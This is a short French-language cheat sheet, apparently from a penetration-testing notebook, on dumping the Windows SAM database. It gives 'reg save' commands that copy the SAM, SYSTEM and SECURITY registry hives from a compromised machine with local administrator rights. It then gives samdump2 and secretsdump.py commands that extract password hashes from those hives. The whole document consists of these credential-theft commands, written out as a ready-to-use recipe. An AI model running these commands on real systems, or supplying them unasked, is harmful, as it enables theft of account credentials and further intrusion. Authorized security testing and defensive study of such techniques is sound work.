# Base SAM

## Récupérer la base SAM

En PowerShell sur une machine compromise, il faut exécuter les commandes suivantes :

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

_Note : les droits "administrateur local" sont requis._

## Extraire les _hashs_

```
samdump2 system sam
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL # Fonctionne pour W10 et W11
```
